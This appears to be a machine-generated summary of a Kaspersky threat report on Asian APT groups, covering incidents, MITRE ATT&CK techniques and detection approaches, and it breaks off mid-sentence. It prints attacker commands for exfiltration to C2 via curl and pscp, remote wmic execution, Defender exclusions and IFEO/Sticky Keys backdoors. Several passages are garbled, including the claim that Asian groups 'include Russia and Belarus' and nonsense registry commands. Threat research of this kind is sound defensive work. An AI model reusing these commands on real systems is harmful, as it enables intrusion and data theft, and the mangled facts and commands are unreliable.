      "Comprehensive Summary of Modern-Asian-APT-groups-TTPs_report_eng.pdf:\n",
      " Kaspersky is constantly tracking thousands of malicious actors all over the world, including highly advanced groups that are capable of conducting sophisticated cyberattacks . These formidable groups are globally recognized as Advanced Persistent Threats (APT) Asia APT groups include Russia and Belarus, Indonesia, Malaysia and Pakistan .  Asian APT groups attacked the greatest number of countries and industries . Analysis of hundreds of attacks revealed a similar pattern among various groups . They achieve specific objectives at various stages of the Cyber Kill Chain using a common but limited number of techniques encountered by security professionals all over the world .  Report: Modern Asian APT groups: Tactics, Techniques and Procedures . It is not our goal to attribute a particular group to a specific country in Asia . Our goal is to provide the most extensive information on the approaches taken by APT actors, their TTPs and ways to mitigate these attacks .  Most organizations are often unprepared to meet these threats and therefore encounter difficulties detecting an attacker within their network . This report will be most useful to the following: This material can serve as a library of knowledge on the main approaches used by Asian APT groups when they hack an infrastructure . The report also contains detailed information on the attackers’ tactics, techniques, and procedures (TTPs) based on the MITRE ATT&CK methodology .  Kaspersky Cyber Threat Intelligence team gathers and analyzes data on APT threats and financially motivated attacks . Team relies on state-of-the-art tools, practices, and approaches, such as MITRE ATT&CK, F3EAD, Pyramid of Pain by David Bianco .  This report consists of 6 main sections in which each reader can easily find the information they are interested in . This section contains information on five unique incidents that we detected in different parts of the world . At the end of each section, we put together a consolidated table showing the TTPs of the APT groups that we encountered in these incidents .  Report provides a top-level look into the motivations and behavioral patterns of Asian APT groups . Statistics on attack victims provide consolidated statistics on the victims . Appendix contains the SIGMA rules that can help to detect the techniques described in this report . Each technique contains a detailed description of the individual techniques that we detected .  The actual SIGMA rules can be found in the Appendix: SIGMA 6 . Almost every quarter, someone publishes major research devoted to campaigns or incidents involving Asian APT groups . These campaigns and incidents are targeting various organizations from a multitude of industries .  An unprepared infrastructure is the primary factor enabling Asian APT groups to conduct successful attacks . To counteract targeted attacks, you must understand the tactics, techniques, and procedures of threat actors. For this purpose, in this section we gathered information about incidents .  The samples observed in the described incidents were also observed by us in other countries, including Canada, Vietnam, South Africa, and Japan . For each incident, we described various stages of the attack and highlighted the threat actor's TTPs . A more detailed description of the APT actors techniques is provided in the Technical details section .  Out of the many incidents that we examined, we selected those that revealed the most about the behavioral patterns of Asian APT groups . The detailed description of a particular incident includes an in-depth history of the attack progression. We included the actual command-line arguments, registry keys, and paths and names of the files and utilities employed by the actors behind the attack. We altered only the sensitive information.  In 2022, our systems detected an attack employing malware known as WebDav-O that targeted a government agency in Russia . This activity was aimed at government-linked targets located in Belarus . The attacking group exploited a vulnerability in IIS Windows Server to get initial access to the victim .  APT actors usually create a Windows service Create or Modify System Process: Windows Service T1543.003.003 . A rather unusual operation in this incident was when the attacker changed a registry key so that the malicious DLL was run with the command line \"svchost.exe -k netsvcs\", which looks legitimate .  The malicious DLL is one of the WebDav-O implants that communicates with Yandex Disk . Other implants communicate with DropBox and Mail.ru C2 . Attackers created a new Windows service named SQLReader with the executable file \"svchost.exe -k netsvcs\"  When searching for objects associated with sqlrder.dll in Kaspersky TIP, the Research Graph tool showed a link with the APT group known as CoughingDown . One of the malware used by Mail-O is a network sniffer and loading module . Both use a cloud platform for data exfiltration by simultaneously sending data during predetermined working hours .  The WebDav-O variant observed in this incident uses the Yandex Disk cloud service to host files with commands for the implant . After gaining access to a given storage account using hard-coded credentials, the malware can negotiate an encryption session key and subsequently read and process command files encrypted with this key . The contents of these files then allow operators to upload and download files from the target file system .  Malware checks the network connection using GET webdav.yandex.ru/test3.txt . Malware then executes the specialized Webdav method PROPFIND .yandEX/test, which receives an XML file in response . This XML file contains multiple paths to data resources, and each set of data is extracted using a GET request and decrypted using the session key mentioned above .  The attacker executed a series of ping commands: Then viewed the connected network drives: Then attempted to connect to remote hosts via SMB using a compromised account: The operator also conducted reconnaissance on remote hosts by using the wmic.exe: cmd.exe /c C: & cd\\ & cd \"\" & wmic /node:<ip> /user:<domain>\\<username> /password: <password>  Incident 1: Russia and Belarus MITRE ATT&CK matrix technique . Remote System Discovery . Permission Groups Discovery . Use Network Share Discovery . Ping -n 1 administrators, 1 admin-pc and 1 dc01 ping <host> C:\\Windows\\System32\\logfiles\\portscan.exe .  Domain Trust Discovery was discovered by an attacker in Russia and Belarus . The output results of the discovery were saved to %temp%\\temp.txt . The attacker read these results and then deleted them: Running malware on a remote system — Masquerading: Masquerade Task or Service .  An important stage of the attack is obtaining user credentials . User credentials allow attackers to elevate their privileges and move laterally through the network . We observed activity of the procdump. exe tool, which can be used to create a memory dump of the lsass.exe process .  In addition to wmic.exe, the attackers also used PsExec to move through the network: To obtain user credentials from remote hosts, they used the following techniques: • OS Credential Dumping: Security Account Manager T1003.002 • OS . Credentials Dumped: Cached Domain .  C2 server — Exfiltration Over C2 Channel T1041: rar.rar a 162.rar -r \"\\\\[REDACTED]\\С:\\Windows\\Temp\\*.save\" -p<password> pscp.exe -P 8443 -pw [REDACTED] After saving the files containing credentials, the attackers added them to an archive and then sent them to the C2 .  The attackers used a customized tool called HTran1.1 . The tool is an open source tool for port forwarding that is available on GitHub . It appears to be an adapted version of the tool found on GitHub because it has an additional parameter for the \"LocalIpAddress\" option .  In this incident, the attackers ran a malicious executable that had already been downloaded to the system (MD5: 0024EE86702EE9234771731975E9EE47) The process ran the file $appdata\\brmsl.mui (2.bin - MD5: 123FD2B1D1C1A03227B0E75572082436) It also set this file as the registry key value for the COM object Shell Rebar BandSite, which corresponds to the DLL file С:\\Windows\\system32\\explorerframe.dll .  The described activity was part of a prolonged campaign aimed at one of Russia's government agencies . According to our telemetry, this malware was also used against entities located in Belarus . The group responsible for this operation displays a high level of motivation . Their main goal is to persistently reside in the infrastructure and conduct espionage .  GhostEmperor is an APT group that has been tracked since 2021 . It is engaged in cyberespionage in various sectors, including government and financial organizations, energy and technology companies . The group uses various attack methods, including phishing campaigns, software vulnerability exploits, and network traffic interception .  GhostEmperor mainly targets government and corporate networks in Southeast Asia . The group uses various attack methods, including spear-phishing, malicious email attachments, and network vulnerability exploits . They also use remote access tools (RAT) and custom-developed malware to gain access to the victim's systems .  The first step of the attacker on the victim's system is to download legitimate software named meupdate.exe (MD5: 0114B3BF0B53DEB5B9C300B2295DD71F) with a legitimate signature from Microsoft Corporation . This software is an update component that is built into the Windows Edge browser . It is delivered through the LOLBin utility named certutil.exe .  A malicious library is also dropped into this directory—msedgeupdate.dll . After the process is started, the malicious library establishes network connections with the following IP addresses . The specified addresses are the attackers' command and control centers (C2) used to manage the malicious software .  The main mechanism of this technique is to create a process in the suspended state . This allows the attacker to inject malicious code into this process . Then the malicious DLL is executed in the address space of the legitimate process . The attacker is often disguised as a legitimate process (Masquerading T1036)  A similar process chain is observed when the attacker conducts reconnaissance of the environment . The threat actor uses a standard set of commands that allow them to collect basic information about the infected system . Incidents involving Asian APT groups in various regions of the planet | Incident 2. Indonesia .  System Network Configuration Discovery: Internet Connection Discovery T1016.001 ping.exe -n 1 -a 10.1.2.98 Group Policy Discovery T1615 . System Information Discovery: Security Software Discovery T1082 cmd.exe /C systeminfo .  DumpMinitool.exe is part of the Microsoft Visual Studio suite . The tool is very popular on Asian forums when discussing how to bypass security mechanisms for dumping lsass.exe . The attacker used the traditional method for implementing this tool: After gathering information on the environment, the attacker attempted to obtain the user credentials for lateral movement through the network .  The tool was always delivered together with an archive and was run from open directories . The attacker simultaneously uses three tools with two different libraries: $windir\\Help\\help\\ssp.exe, $new.exe and $duplicatedump.exe .  The tool named ssp.exe (MD5: AF893448B4D1862C42D6E1CC3AA8878D) is a built variant of the publicly available mimikat_ssp tool3 . The second tool, DuplicateDump.exe, is also used to compromise and steal account credentials from lsass. exe .  The tool obtains a ready-to-use handle for the lsass.exe process without calling OpenProcess . It bypasses conventional detection of LSASS dump based on the Sysmon event4\"Process Access\" with an event ID 10.006: In addition to the process dump, the attacker attempted to find passwords in group policy files .  We were not able to obtain this file during our incident investigation . The purpose of this download remains unclear . Nonetheless, any use of tools to download files from suspicious external IP addresses within a domain is definitely a suspicious event . Relevant information is gathered by using archives that are stored in the same directory as before: \"$windir\\ Help\\Help\"  The most likely goals of the attackers are cyberespionage and data exfiltration . The attackers employ the favored technique of Asian APT groups for persistance in the infrastructure . The attack also employs tools that are predominately popular on Asian forums for obtaining user credentials .  In mid-Autumn of 2021, Kaspersky experts detected a new ShadowPad malware campaign targeting one of the national telecom companies of Pakistan . Based on the collected data, we can presume that the attack began no later than the winter of 2021 . The attackers were active on the network for at least 11 months .  The mail server of the victim had a Web Shell in the form of a malicious DLL used by the attackers to gain remote access to the server . This was previously seen in the well-known Web Shell named \"China Chopper Webshell5\" The backdoor was installed in the system as a Windows service .  Cobalt Strike typically uses services with names consisting of 8 random characters: Windows Command Shell T1059.003 + . Windows Service T1543.003 . The executable file used for the service was cmd.exe with parameters for running a script in . PowerShell . This script contained binary (shell) code with a size of ~100 bytes .  Cobalt Strike does not connect to a C&C server . Instead, it opens a network port and waits for a connection . To work properly, the malware must receive binary shell code that will be executed synchronously . The LOLBin tool certutil.exe (Living off the Land Binary) was used to install the malware .  Cobalt Strike uses the JMP command to divert execution to the received shell code . The victim must have an open public IP address, or the attacker must be in the same subnet as the victim . The attacker often uses \"pivoting\" to route traffic that is not usually routed in normal conditions .  The sample uses BITS Jobs to access the C2 and download the text file node.txt . The text file was converted into an executable file named node.exe (MD5: 344edbebb97ed97ed8dfe79805a721b4048b)  The attackers move node.exe to C:\\Windows\\Registration\\crml.exe, change the file attributes by making it a system file, and create a scheduled job: attrib +s crml.ex schtasks . The attackers also downloaded the ShadowPad backdoor and downloaded the following two . executable files with the TXT extension from Google Drive .  ShadowPad DLL (mscoree.dll) is loaded into the legitimate process AppLaunch.exe . On the compromised server where the Web Shell was installed, we also detected a download of the ShadowPad backdoor via BITS Jobs . We were also able to detect different variants of DLL Sideloading used to download the backdoor .  $temp\\aro.dat > C:\\inetpub\\wwwroot\\ aspnet_client\\1.txt OLEVIEW.EXE MD5: FDD423B3855A9AE5E83FFB1CC80D2215 (x86) iviewers.dll connects to the C2 server and downloads the ShadowPad backdoor from it . Then creates a new .svchost.exe process to avoid detection and injects the malicious payload of ShadowPad into this process .  Using the backdoor, the attackers were able to execute commands remotely and download new tools . As a result, we see that cmd.exe was run from the ShadowPad-infected svchost.exe and a series of commands for reconnaissance: Data from Local System T1005 . After executing discovery commands, the attacker copied the contents of the desktop and downloads folder into the directory C:\\$recycle.bin\\temp .  A suspicious file was run from the recycle bin (c:\\$recycle.bin\\temp) We also detected a dump of the SAM registry hive using the system utility reg.exe . LSASS dump was performed several times over the course of several days . After some time, the attackers used the procdump64.exe tool, which was renamed to errorreport.ini .  BAT file $windir\\help\\sys.bat was executed to mount network drives using the compromised credentials of a user . We noticed POST requests from the .svchost process (ShadowPad) to the following resources (probably to exfiltrate the collected data): Collection and Exfiltration on another infected host .  Order command was used instead of the ping command in the sleep role: order order.cargobussiness[.]site/ documents.kankuedu[.]org/ live.musicweb[.]xyz oboo.videocenter.org tech.obj[.]services houwags.defineyourid[.]sites .  The file $temp\\Err_36d96944_6318.log contains a base64 string containing the following script . This complex type of startup is a technique known as Obfuscated Files or Information T1027 . The script uses a . recursive search to gather files with the extensions *.txt, *.rtf, *.pdf, *.ppt , *.pptx, *.docx, *.csv, *.xls, *.vsd, *.pst, *.eml, *.jpg, *.jpeg, and *.png . It then copies them to a separate directory, archives them, and runs an exfiltration script .  This incident describes another campaign of the ShadowPad malware aimed at national infrastructure . The main goal of the attackers is to gather critical or confidential data through cyberespionage . The campaign primarily involved use of the technique known as Hijack Execution Flow: DLL Side-Loading T1574.002, which is typical of Asian APT groups .  In February of 2023, our SOC team was alerted about a potential security breach observed in telemetry of one of our customers . Further investigation revealed that the well-known APT group known as ToddyCat was probably responsible for the attack . Details of the incident are described below .  ToddyCat alert triggered by pattern of implementing LZSS algorithm in memory of a process that was detected by Kaspersky Endpoint Security (KES) The DLL file of the Windows service was found in the following registry key: CommandLine: С:\\Windows\\system32\\svchost.exe -k fontcsvc . FontCacheSvc service was started by the services.exe process while an RPC connection from a remote host was established .  Service process connected to 154.202.56[.]211:443 and made a POST request . This indicates that the service was created from the remote host using the sc create command . Remote host was not connected to monitoring system and we were unable to get event log files from it .  Malaysia DLL: С:\\Windows\\system32\\up.dll MD5: 5448F7DB84E87FEDD362F4A79C9BC302 Registry hive: HKLM\\SYSTEM\\ControlSet001\\Services\\ctt Commandline: cmd /c start /b rundll32.exe (MD5: BEBBEBA37667453003D2372103C45BBF)  The attacker was able to connect to a remote C2 server with a scheduled task . The scheduled task was run to search for documents in user folders and save the found files in a new folder with the hostname in a temporary directory . When successfully connected, the operator created a task on the remote machine .  Indicator Removal: Clear Persistence T1070.009 After running the script, the job was immediately deleted . The attackers delete artifacts of their persistence to conceal signs of their activity . Another potential reason for deleting the task after its execution could be to prevent errors that may arise if the malware is redeployed .  The argument sent to the program is a file name in the form of an encoded string . This file is intended for sending data to the Dropbox cloud service . We saw above that persistence was facilitated by creating persistence by creating an executable file . This executable file is meant to send data to Dropbox .  The following files were moved from the operator's machine to another one . VLC Media Player is vulnerable to DLL Hijacking . To run the RAT via DLL Sideloading, the attackers created a service remotely using sc.exe . After starting the service, the vlc.exe process loads a malicious library that it turns decrypts the . RAT configuration file .  ToddyCat used an additional tool that created an administrative account (Create Account: Domain Account T1136.002) A scheduled job was created to run this tool . The command shell is used by the operator for reconnaissance and lateral movement through the network . The request to the C2 server is sent to hxxps://45.124.115[.]83/collector/3.0/ and downloaded from it .  Using a RAT, the operator downloaded the PsExec tool: Ps2.exe . username, and password are hardcoded in this tool . The SMB protocol was used when creating a Windows service or task on a remote host . We also saw the use of PsExec and AtExec .  The last command uses the technique known as Event Triggered Execution: Accessibility Features T1546.008, specifically through the Accessibility Featur called Sticky Keys . As expected, we observe the psexesvc service being created on the remote computer:  KES blocked the scripts that were used to gather user documents, so the attackers were forced to change their approach . They wrote a batch script (MD5: 114DECCBB815C520DD2291C946A3A7ED) The next interesting tool we found was a DLL Hijacker library that tracks the creation of new files .  The samples used in the attack can be tentatively attributed to ToddyCat . An article about this APT group was previously published on the Securelist portal7. The group behind this attack was entrenched in the infrastructure for a long time, and had a store of created user accounts that the attackers could use .  In April of 2022, we detected an incident related to a government agency of Argentina . Based on our analysis of the techniques, tactics, and tools employed by the attacker, we can assume that these actions were taken by the APT group known as Dark Seoul .  The data collected from the customer's machines allowed us to reconstruct a timeline of events and analyze this incident in detail . The attackers gained initial access by exploiting the vulnerability CVE-2021-44228 (Log4Shell) in VMware Horizon .  The attackers created Windows services with names that are similar to legitimate services (Masquerade Task or Service T1036.004) To run ransomware on other machines in the network, they created a scheduled task that started the malicious program . Here is an example log for ransomware started through the Task Scheduler: %SystemRoot%\\System32\\svchost.exe -k msupdate2 .  The malicious files that were used during exploitation of VMware Horizon were packed by Themida to conceal them from analysis . Most of the malicious files used by the attackers used by them were obfuscated . The most of the PowerShell commands used were those of the attackers .  The ProcDump tool was used to obtain account credentials from infected machines: OS Credential Dumping: NTDS T1003.003 To access the passwords of all users in the domain, the attackers dumped of ntds.dit: Network Service Discovery T1046. To detect open ports on machines in the network, the . attackers used custom . scripts and ran them on the systems: net use * /delete /y PowerShell .  'create full С:\\Windows\\temp\\ztemp' q q & { Invoke-PortCheck -network 10.0.48 -port 22,80,445,443,3389,8080 } Content Modification Time,REG,Registry Key__[\\Software\\Sysinternals\\ProcDump] EulaAccepted: [REG_DWORD_LE] 1__,winreg/winreg_default,OS:/data/C/Windows/System32/config/DEFAULT, Source: SYSTEM .  System Information Discovery T1082 Collecting information from systems, resources, and applications . Remote System Discovery T1018 Searching for systems in the network . To move laterally through the network, attackers used RDP and other services to connect to Windows machines .  Service Type: user mode service Service Start Type: demand start Service Account: LocalSystem Service Name: BTOBTO Service File Name: %COMSPEC% /Q /c echo . $wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $temp file = 'kill.bat', 'С:\\Windows\\ ccalc.exe'  The PuTTY tool was used to connect over SSH to remote hosts . Ingress Tool Transfer used to transfer tools between hosts . Incidents involving Asian APT groups in various regions of the planet have occurred in recent years . Incident 5.67 occurred in Argentina . Incident was the result of reconnaissance on remote hosts using smbexec .  HolyGhost was written in Go and contains functions for detecting execution within a virtual environment, disabling user shares, and creating and deleting the service that is used to run this malware . HolyGhost can create scheduled tasks on machines in the network for the purpose of encrypting other machines .  APT group Dark Seoul used HolyGhost ransomware in the analyzed attack . The attackers' successful use of these techniques may indicate that the group chooses its victims based on the level of security of their infrastructure . Users' encrypted files are encrypted using the AES algorithm .  The victims of these attacks are spread worldwide, making it challenging to pinpoint any specific region that is more frequently targeted . The attackers utilize the same tactics in different parts of the world, indicating their ability to employ a uniform arsenal for various victims . This combination seems to be a signature move for Asian groups .  of these Asian groups is cyber espionage, where they gather sensitive data and then exfiltrate it to legitimate cloud services or external resources . Rare scenarios, as described in incident No. 5, deviate from this norm . In subsequent part of the report, titled \"Technical Details,\" we will examine the most commonly employed techniques by Asian APT groups .  This section provides a detailed technical description of most TTPs that we detected from Asian APT groups . The actual SIGMA rules can be found in the SIGMA section . Each described technique consists of the following subsections: SIGMA Rules List of rules related to this technique . Examples of procedures Examples of detected uses of the technique . Detection Approaches employed to detect the technique as well as EventIDs of events in various monitoring agents .  The technique known as Exploit Public-Facing Application T1190 involves attackers’ attempts to exploit vulnerabilities in applications that are accessible over the internet . APT actors may use various tools to search for vulnerabilities in publicly available applications . When a vulnerability is detected, attackers may exploit it to perform various actions, including hacking the system, stealing sensitive data .  Vulnerabilities are most often found in web applications, mail services, remote administration tools, and similar types of resources . Asian APT groups often exploit vulnerabilities to gain initial access to the systems of their victims . They may also exploit vulnerabilities in web servers to remotely execute code and install malware .  APT group known as Dark Seoul exploited the CVE-2021-44228 (Log4Shell) vulnerability in a VM Horizon server . In addition to vulnerability exploits, a large number of brute-force attacks on network services were also detected .  Another GERT investigation related to an Asian group revealed an exploit of the CVE-2021-26855 ProxyLogon vulnerability . Researchers also describe cases when APT groups used zero-day vulnerabilities to attack organizations in Russia . We understand that many groups use various VPN/ proxy/VPS to conduct attacks and gain initial access .  The exploit is performed from the external host of the actor, and we are only able to detect artifacts of compromise after the attack has already occurred . detection of this technique will rely on perimeter security tools such as IPS/IDS and FW/NGFW, and on WAF- type application security tools .  Phishing is the MITRE ATT&CK classification for a technique that uses fraudulent emails, messages, or websites to deceive people into revealing sensitive information . Phishing attacks are usually conducted in a variety of different ways, including through email, instant messaging platforms, social networks, and even phone calls .  Phishing T1566 technique in the MITRE ATT&CK Matrix involves attacks in which threat actors send emails or messages that deceive users into providing their account credentials or performing actions that may compromise the system or network . This technique uses social engineering, which is aimed at tricking a person into revealing sensitive information .  The attackers gained initial access through bulk phishing emails sent under the guise of government regulators . The malicious attachments in those emails were self-extracting archives containing an office document and a malicious executable file . When the phishing attachment is run, a malicious MSI package is installed and this package creates a service for communicating with the C2 servers of the attackers .  DexCone employed various social engineering techniques, including phishing emails that contained malicious attachments or links to fake websites . When a user reached this type of website and entered their account credentials, the attackers gained access to the user's bank account . The group became known as masters of phishing .  Pangolin is spread through phishing emails and malicious websites that may be specially created for this purpose . It can capture data that is entered through the victim's keyboard, including usernames and passwords, and copy files, take screenshots, and intercept .  Pangolin can also install other malware to the victim's computer opening a path for additional attack vectors . The distribution model for this Trojan is still private, and in 2021 we observed the exclusive use of a new modified version by attackers from ZexCone . We also detected a phishing campaign that targeted various clients but used similar malicious attachments with identical functions .  PaymentSlip.pdf was run on the victim's computer, several files were saved to shared directories . Then the attackers ran PowerShell and added these files to the MS Windows Defender exclusions list . After that, they used the standard tool named schtasks.exe to create scheduled tasks .  When 25th April_PDF.exe is run, it uses PowerShell to change the configuration of Windows Defender . Then it creates a task in the scheduler to achieve persistence: \"$windir\\$system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" Add-MpPreference -ExclusionPath \"$selfpath\\$selfname.ex\" (MITRE: T1562)  The 24th April_PDF.exe sample also adds itself to Windows Defender exclusions, then gathers account credentials from browsers . The following approaches are used to detect phishing: Deployment of Secure Email Gateway solutions with dynamic technologies (sandbox) for scanning attachments in emails .  Phishing email RAR contains Masquerading extension Dropped Dropped PDF TMP EXE Create scheduled task Star power shell Exclude malware Imporing task EXE 86 . You can also create correlation rules that may indirectly indicate a phishing campaign based on the following events .  Command and Scripting Interpreter T1059 is a technique in which attackers run commands, scripts, and executable files on their victim's system . A command shell is the main tool used by the attackers to interact with local and remote systems . After gaining access to a command shell, actors can conduct reconnaissance of current user and running processes .  Attackers use command line utilities to disable security mechanisms and move around the network . They can also check access to groups, probe open network connections, and much more . Attackers can also use CMD to entrench themselves in the system .  APT actors often execute their commands from Windows CMD, which lets them manage many system components . They can use batch files (with the BAT or CMD extension) to create scripts automating repetitive operations . They often embed commands into their initial payload that is delivered as Microsoft Office documents .  Command and Scripting Interpreter: Windows Command Shell T1059.003 89 Contents Modern Asian APT Groups: Tactics, Techniques and Procedures . Attackers use cmd.exe to download tools that they will use in subsequent stages of an attack to the compromised system .  Attackers employ their own batch scripts to perform repetitive actions on a local host and remote ones . The script gathers data on the system and saves this data to files, then adds them to an archive . Operators exfiltrate the collected data to an external service: curl -F \"file=@$selfpath\\1.rar\" bb ping www.yandex.ru >> С:\\Windows\\Web\\systeminfo.txtbb tracert -h 5 . date /t >>    and date date .txtbb netstat -aon -bv >>  -bv:  \"Systeminfo\" is the name of the system .  / domain >> С:\\Windows\\Web\\systeminfo.txtbb net group \"domain computers\" / domain/. / domain_trusts . / domain . / domains . /domain . /Domain . / Domain . /Domine . / Domine .  The script performs a search for documents in user directories that were modified during the past 8 days . The script copies the found files to a temporary directory, then archives it and deletes the copies . This script was run as a scheduled task .  CMD is also used by system administrators for legitimate purposes . The line between malicious activity and legitimate activity can appear quite fuzzy in this case . One of the ways to detect malicious activity is to track specific usage scenarios such as running CMD from non-standard processes .  The tool is a powerful tool that provides a command shell and a scripting language developed by Microsoft . It is a full-fledged object-oriented language with variables, functions, classes and objects . This language enables you to access and manage various system components like files, processes, and registry keys .  PowerShell was built upon the .NET framework, which provides access to a wide range of libraries and APIs . It also allows you to remotely manage Windows systems using the WinRM protocol (PowerShell Remoting) Let's examine some examples of using using PowerShell by Asian APT groups .  Asian APT groups also use PowerShell scripts to automate their activities . Using aliases, you can even create your own aliases using set-alias . This makes it more difficult for analysts to detect attacks using aliases . Using the Start-BitsTransfer and Invoke-WebRequest can download files from a C2 server .  The Base64-encoded string is the next PowerShell command . This script is intended to collect user data . The use of the method DownloadFile for downloading a batch script on the system, the further execution and deletion of the script is possible .  To detect malicious activity in PowerShell, you must monitor the Microsoft-Windows-PowerShell/Operational log . Maintaining a log can provide information on the execution of scripts or commands . A Base64 string executed by PowerShell with the -EncodedCommand option will be saved in its decoded form in the log .  WMI (Windows Management Instrumentation) is a Microsoft technology that provides a single interface for managing components of a local or remote operating system . WMI enables administrators and developers to monitor data on hardware, software, and network resources . Threat actors can also obtain intelligence on the system, run malware, move through the network, and control remote systems .  The Wmiexec module of Impacket is used by Red Teams as well as by attack groups . WMI uses WMI technology and allows a threat actor to execute commands on a remote system . To remotely connect and execute a command, you must use a valid username and password .  When using Wmiexec, the attacker's commands are executed on the target system on behalf of the wmiprvse. exe process . By default, by default, the command is redirected to a file created in the ADMIN$ folder on the remote host .  This technique can be detected by tracking WMI activity . It might be necessary to profile the child processes of wmiprvse.exe for each organization because system administrators may use and deploy their own WMI scripts on workstations .  Use the wmic.exe tool to execute commands on remote hosts with the keyword /node: 3 Tracking dicovery commands executed using the . tool: 4 wmic / node:<ip> /user:<domain>\\<username> /password:<password> process call create <command>  Windows lets developers use another interface called Native API . The functions of the Native API implemented in ntdll.dll often begin with the Nt prefix . The Native API implementation resides in ntoskrnl.exe . Via system call, execution is transferred from user mode to kernel .  Native API is very attractive to an attacker because it is the lowest level where code is still executed in user mode . This means that Native API functions often provide a wider range of functionality than Win32 . The lack of documentation on many interface functions complicates detection logic for tracking malicious actions .  Native API techniques can be detected by security solutions such as EPP and Sandbox . These types of solutions let you track the behavior of objects at a low level, and therefore allow you to identify malicious use of the Native API . This technique is used to describe scenarios in which attackers use various system mechanisms that initiate startup of applications when certain events occur .  Windows Management Instrumentation (WMI) Event Subscription is a popular technique for persistent entrenchment on a host . Threat actors can utilize WMI capabilities to create a subscription to an event and execute arbitrary code when this event occurs . Attackers also use this technique to elevate their privileges because code execution can run under an account with higher privileges .  The GDrive-3k backdoor was run by the wmiprvse process . Attackers created the following classes for persistence and execution of their malicious code: Event Triggered Execution: Windows Management Instrumentation Event Subscription T1546.003 .  To detect this technique, you must track the creation of WMI subscriptions . A WmiEvent provides complete information on WMI activity that can be used to determine whether this activity is malicious . Additional detection capabilities can be based on command-line options for a process creation event .  Image File Execution Options (IFEO) is a Windows registry key that is used by developers to connect a debugging tool to an application . When the application process is started, the debugger specified in the IFEO is used to connect the application to a debugger .  The IFEO key enables attackers to persistently obtain persistence in the system . IFEO is located in the following Windows registry tree: Event Triggered Execution: Image File Execution Options Injection T1546.012 After adding this registry key, cmd.exe will be automatically created whenever Notepad.exe is started .  Asian APT groups use the technique known as Event Triggered Execution: Accessibility Features T1546.008 . In this example, attackers used IFEO to install a backdoor that could be started from the Windows lock screen . Some programs from the Ease of Access category, specifically Sticky Keys (sethc.exe), can be started directly from the .  The attackers created a Debugger key for the Sticky Keys program (sethc.exe) As a result, pressing the Shift key five times opens a command line with administrator privileges . The attackers can take control of the system using the hotkey Windows+U .  Reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"С:\\Windows\\system32\\cmd.ex\" /t REG_DWORD /d 512 reg add \"Notepad.EXSE\"  /v GlobalFlag /t Regulator /tRegulator: Notepad.Excerator . Excerator: Debugger /d Debugger: \"Windows NT\" Regulator: \"Image File File Execution Options\"  COM Hijacking most often involves replacing a legitimate COM server DLL with a malicious DLL . This technique lets threat actors execute arbitrary code in the context of a legitimate process . The links between the links between them are stored in the registry .  We encountered COM Hijacking in one of the incidents examined above . A process that was run with the following command line added a registry key corresponding to a COM object . To maintain persistence without being detected, attackers go after the COM objects that are most frequently used by processes but will not disrupt system functionality .  The attackers chose the COM object {ECD4FC4D-521C-5 21C-11D0-B792- 00A0C90312E1 (Shell Rebar BandSite) corresponding to C:\\Windows\\system32\\explorerframe.dll . After the DLL was added to the registry, the process ran it using rundll32.exe: $appdata\\brmsl.mui .  Using the COM Hijacking technique, you can track events involving unsigned DLLs being loaded into trusted processes . You can also correlate changes made to registry values containing paths to COM objects with the loading of these COM objects into trusted . processes or with the start of COM servers as individual processes/services .  In the technique known as BITS (Background Intelligent Transfer Service) Jobs T1197, attackers use BITS to load and execute malicious code on a target system . BITS is a service that is built into a Windows operating system . Hackers use it to conceal malicious code .  BITS is used by many applications and services in Windows to update the system, download files, install programs, and perform other file transfer operations . It provides a convenient mechanism for efficient and reliable transfer of files in background mode . BITS service works in the background and can forward data over encrypted communication channels .  The main way to detect the BITS Jobs T1197 technique is to look for process creation events . Process creation events can be found by looking for Event ID 4688, for example, or EventID 1 of the Sysmon agent . To detect this technique, you must pay attention to the relationship between a parent process and child process .  Attackers exploit existing domain user accounts whose credentials they were able to obtain during the Credential Access stage . Strict access restrictions help mitigate the damage that can be caused by compromised user accounts . Microsoft suggests an approach to managing privileged account credentials based on Zero Trust principles .  The most frequently used implementation of this technique is to use a domain administrator account that allows attackers to move laterally through the network . Use of a compromised account is accompanied by other actions related to the Account Manipulation T1098 technique, such as changing the password and/or adding the account to groups .  To detect this technique, you can focus on any anomalies found in telemetry and events related to specially created bait accounts (honeypots) The scheduled tasks function is available in all operating systems . Malware programs are able to run each time the system starts or at a specific time according to a schedule .  The technique is part of the MITRE ATT&CK Privilege Escalation tactic . Scheduled tasks provide a convenient way to automate routine or temporary tasks such as system maintenance, backups, startup of applications, or data synchronization . For system-level tasks or tasks requiring elevated privileges, administrators may be required to configure a startup task .  A scheduled task initiates execution of malicious code in the system . This can be done by scheduling a startup task for a specific time or in response to specific conditions . By creating a scheduled task that runs when the system starts or runs at specific time intervals, attackers can guarantee their malicious code remains active .  The HolyGhost ransomware spread by the APT group known as Dark Seoul also created a task using schtasks . In one of the incidents involving the ShadowPad backdoor, an operator added a system file attribute to malware before creating a scheduled task to run this malware .  To detect the creation of scheduled tasks in the system, you can use Windows log events such as EventID 4698 . You must also track the startup of processes related to task creation . You should pay attention to the following task creation parameters: Running an executable file from shared folders . Creating a task in the context of another user: malicious .  Modern Asian APT Groups: Tactics, Techniques and Procedures Server Software Component T1505 . This technique involves the operation of various components and services working on a server, such as web services, application services, databases, mail services, and much more . Threat actors often target these components to target .  Asian APT groups exploit popular vulnerabilities of web servers . After gaining access, attackers can install a backdoor on a web server and/or a Web Shell to establish persistence in the system . A Web Shell is a command shell used for remote management of the web server . Malicious DLLs were found on a mail server in Pakistan .  An Asian group exploited the vulnerability known as CVE-2021-26855 ProxyLogon . The primary way to detect a Web Shell is to track the startup of a command shell from a web service process . Instead of cmd.exe, the attackers can use other executable files .  You must also monitor web service logs to look for anomalous requests, such as unusual User Agent or Referrer requests in an HTTP header . APT actors may create or modify services to repetitively repetitively . sort of behavior . In addition, you can track the creation of new files in a web directory .  Windows services are processes that are managed via the Service Control Manager (SCM), which starts, stops, suspends, and resumes services . Services can be used to configure the execution of malicious code at system startup or at a repeated interval . execute malicious payloads for privilege elevation and persistence .  Asian APT groups usually modify the registry for this purpose . A service can be created by adding a new registry key to the Services tree . The sc.exe utility for interaction with the SCM is used to create a new service or modify an existing service .  Asian APT groups typically create a malicious service that runs in the context of the svchost.exe process . For the service running in the . context of . the . service, they usually specify a ServiceDLL . parameter containing the path to the . DLL file that implements the service and 